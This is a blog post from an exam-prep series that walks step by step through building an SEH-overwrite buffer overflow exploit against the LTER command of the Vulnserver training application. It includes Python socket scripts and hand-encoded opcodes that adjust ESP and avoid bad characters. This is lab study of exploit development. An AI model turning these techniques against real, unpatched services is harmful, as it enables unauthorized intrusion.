---
layout: single
title: CTP/OSCE Prep -- 'LTER' SEH Overwrite Version 2.0!
date: 2019-6-03
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
  - SEH
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post we'll be using the skills we picked up last post to find our own way to exploit the 'LTER' command with an SEH overwrite.

If you have not already done so, please read some of the posts in the 'CTP/OSCE Prep' series as this post will be **light** on review! 

## Background 

This will be our third go at the 'LTER' command on Vulnserver. 
+ [The first time](https://h0mbre.github.io/LTER_SEH_Exploit/), I failed miserably to use the SEH overwrite, but I ended up discovering and EIP overwrite vulnerability with a smaller fuzzing payload.
+ [The second time](https://h0mbre.github.io/LTER_SEH_Success/#), I used @doylersec's approach to the SEH overwrite and worked through the exploit step-by-step for hours and was finally able to complete my own exploit modeled off of Doyler's.

Armed with the ability to use alphanumeric shellcode and a better understanding than the first time around, let's try to come up with our own unique take on the exploit and try to come up with something that's original to us.

## Getting Started

We will pick up after the taking the jump code in our 'next SEH address' 4 byte space to jump into our `D` buffer. At the moment, our exploit code looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

buffer += 'A' * 3514 
buffer += nSeh
buffer += Seh
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```
## From `D` Buffer to Top of `A` Buffer

Once we use our netjump in the `nSeh`, we land at the top of our `D` buffer in the address space `0174FFCC`. (**Don't get too hung up on specific addresses as those will change from application instance to application instance, instead focus on the offsets or distances between two addresses. That number should remain static.**)

![](/assets/images/CTP/Ltertake3.JPG)

If we scroll down in the CPU Instructions pane to the bottom, you can see that the last `44` instruction is sitting at `0174FFFF`.

![](/assets/images/CTP/ohyeahLTER.JPG)

To figure out the distance between those two points we do: (`0174FFFF` - `0174FFCC` = `33` or 51 in decimal). So we have **some** room to play with. Previously I tried to make use of this space to jump all the way back to the top of our `A` buffer and put shellcode there but I couldn't make it work because I didn't quite have a good handle on the `SUB` or `ADD` encoding you have to do with the shellcode to make it alphanumeric. 

Let's see what we can do now that we understand it a little bit better.

### Adjusting ESP

As we know, the first thing we have to do before putting our encoded shellcode on the stack is adjust `ESP`. As you can see from our screenshot, `ESP` is residing at `0174ECA4` and we want to put it at the bottom of our `D` buffer since our decoded shellcode will be plopped 'ontop' of it as it's decoded. To figure out how much we have adjust `ESP` we do (`0174FFFF` - `0174ECA4` = `135B` or 4,955 in decimal). So we have to add quite a bit!

To do this, let's:
+ put the current value of `ESP` into `EAX`,
+ add `0x135B` from `EAX`,
+ put the value of `EAX` back into `ESP`. 

In assembly this will look like this: 
```nasm
push esp
pop eax
add ax, 0x135b
push eax
pop esp
```

To get the opcodes, we'll use `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`:
```terminal_session
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
nasm > add ax, 0x135b
00000000  66055B13          add ax,0x135b
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp
```

Now let's update our exploit to reflect this new `espAdj` and test it:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x5b\x13\x50\x5c'
#push esp
#pop eax
#add ax, 0x135b
#push eax
#pop esp

buffer = 'A' * 3514 
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

![](/assets/images/CTP/ltertest.JPG)

As you can see, `ESP` now points to the bottom of our `D` buffer just as we wanted after we step through all of the `espAdj` code. So far so good. 

### Encoding a Long Jump Backwards
Next, we need to encode a long jump all the way back to the top of our `A` buffer. To do this, we will:
+ take a register (`EAX`), manipulate it so that it points towards the address at the top of our `A` buffer,
+ put that value into another register to save it (`EBX`) since we'll destroy the value in `EAX` with the encoding process,
+ and then finally `CALL EBX` which should jump us all the way back to the top of our `A` buffer. 

Let's take care of this before we start any encoding.

`EAX` is currently pointing at `0190FFFF` and we need it to point to the top of our `A` buffer at `0190F20A`. So we do (`0190FFFF` - `0190F20A` = `DF5` or 3,573 in decimal.) The reason I personally keep track of decimal values is because I'm good with regular math but not hex in general. So having a decimal value to reference keeps me grounded in Human Land. 

We normally would do a `sub ax, 0xdf5` and call it a day but unfortunately, this will end up as `\x66\x2d\xf5\0d` in our payload and `\xf5` is a bad character. 

So let's break this subtraction operation up into two chunks that avoids bad chars. Probably multiple ways to do this but I just broke this `df5` value into two chunks `0d` and `f5` and started calculating subtractions by hand. 

`0d` is already fine with us, so we don't need to mess with it much. 

Let's divide `f5` by two and see what we get. The Windows calc says the answer is `7a` but if we multiply `7a` by two, we get `f4`!! The calculator lied to us! In reality, when we divided `f5` by two, there was a remainder of 1. So something simple like that can ruin our math. So now we know that `7a` + `7b` = `f5` and both of those bytes are not restricted! So we know we need to do two sub instructions to get `f5` total:
+ Sub Operation 1 = subtract `7a`
+ Sub Operation 2 = subtract `7b`.

Perfect. But since we have to use a couple `SUB` operations, we have to come up with a way to subtract from our `0d` value that was already ok and not restricted. We don't want to put any instructions in that are `00` since that's a null byte. We can simply subtract `01` the first sub operation and the leftover amount `c7` in the second operation. No division required to figure that out. 
+ Sub Operation 1 = subtract `01`
+ Sub Operation 2 = subtract `c7`.

So all together our commands will look like: 
```nasm
sub ax, 0x017a
sub ax, 0x0c7b
```

This is the exact same thing as `sub ax, 0xdf5` except we don't use a restricted character, pretty cool!
```terminal_session
nasm > sub ax, 0x17a
00000000  662D7A01          sub ax,0x17a
nasm > sub ax, 0xc7b
00000000  662D7B0C          sub ax,0xc7b
```

Let's add the value `\x66\x2d\x7a\x01\x66\x2d\x7b\x0c` to a new variable `eaxAdj` and update our exploit code:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x5b\x13\x50\x5c'
#push esp
#pop eax
#add ax, 0x135b
#push eax
#pop esp

eaxAdj = '\x66\x2d\x7a\x01\x66\x2d\x7b\x0c'
#sub ax, 0x017a
#sub ax, 0x0c7b
#points EAX towards beginning of our A buffer which is 0xdf5 away

buffer = 'A' * 3514 
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += eaxAdj
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

Testing it:
![](/assets/images/CTP/eaxmath.JPG)


## Big Thanks

To everyone who has published free intro-level 32 bit exploit dev material, I'm super appreciative. Truly mean it. 

## Resources
+ [OffSec Alphanumeric Shellcode](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/)
+ [Corelan Mona Tutorial](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
